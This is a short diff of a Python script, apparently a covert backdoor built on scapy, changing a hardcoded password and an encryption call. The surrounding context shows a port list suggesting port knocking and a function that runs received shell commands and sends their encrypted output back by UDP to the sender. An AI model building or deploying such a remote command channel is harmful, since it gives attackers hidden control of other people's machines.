@@ -7,7 +7,7 @@ from ctypes import cdll, byref, create_string_buffer
 
 state = 0
 ports = [1000, 2000, 3000]
-password = 'dumb'
+password = 'abcdefyoyo'
 # unauthClients = {}
 # authedClients = {}
 
@@ -58,7 +58,7 @@ def shellCommand(packet, command):
     print "Running command " + command
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     output = password + output.stdout.read() + output.stderr.read()
-    encryptedData = encryption.encryption(output, configfile.password)
+    encryptedData = encryption.encrypt(output, configfile.password)
     packet = IP(dst=packet[0][1].src)/UDP(dport=8000, sport=8000)/Raw(load=encryptedData)
     send(packet)
 
